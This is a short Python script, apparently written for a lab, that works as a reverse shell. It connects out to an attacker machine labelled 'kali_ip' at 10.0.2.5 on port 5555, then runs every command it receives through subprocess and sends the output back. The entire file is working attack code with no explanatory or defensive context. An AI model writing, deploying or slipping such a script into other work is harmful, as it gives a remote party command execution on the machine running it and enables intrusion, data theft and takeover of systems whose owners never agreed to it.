import socket, subprocess
kali_ip = "10.0.2.5"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((kali_ip, 5555))
s.send("Connected!\n('&' to end)\n\n-".encode())

recived_data = s.recv(1024).decode()

while (str(recived_data).strip() != "&"):
	p = subprocess.getoutput(str(recived_data))
	s.send(p.encode())
	s.send("\n\n-".encode())
	recived_data = s.recv(1024).decode()

s.close()
	


